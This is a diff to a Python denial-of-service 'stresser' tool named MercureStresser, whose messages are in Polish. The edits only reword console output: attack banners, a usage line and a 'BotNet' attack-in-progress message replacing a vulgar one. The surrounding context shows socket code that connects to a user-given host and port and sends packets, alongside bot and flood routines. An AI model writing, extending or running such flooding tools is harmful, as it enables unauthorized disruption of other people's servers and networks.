@@ -47,7 +47,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m • Aktualnie napierdalasz w jakies ip\033[0m")
+				print ("\033[92m • Trwa atakowanie (BotNet)\033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -73,7 +73,7 @@ def dos2():
 
 def usage():
 	print (''' \033[92mMercureStresser \n • Wersja • 0.1 \n • Autor: Mercure \n • Alpha Able v0.1 \n
-	MercureStresser • Uzyj: python3 stresser.py -s <IP> -p <port> -t <szybkość\033[0m''')
+	MercureStresser • Uzyj: python stresser.py  <ip> <port> <pakiety>\033[0m''')
 	sys.exit()
 
 
@@ -120,7 +120,7 @@ if __name__ == '__main__':
 	if len(sys.argv) < 2:
 		usage()
 	get_parameters()
-	print("\033[92mMercureStresser • Trwa atak na ",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+	print("\033[92mMercureStresser • Trwa atak na ",host,":",str(port)," Pakiety: ",str(thr),"\033[0m")
 	print("\033[94mMercureStresser • Laczenie z serwerem trwa\033[0m")
 	user_agent()
 	my_bots()
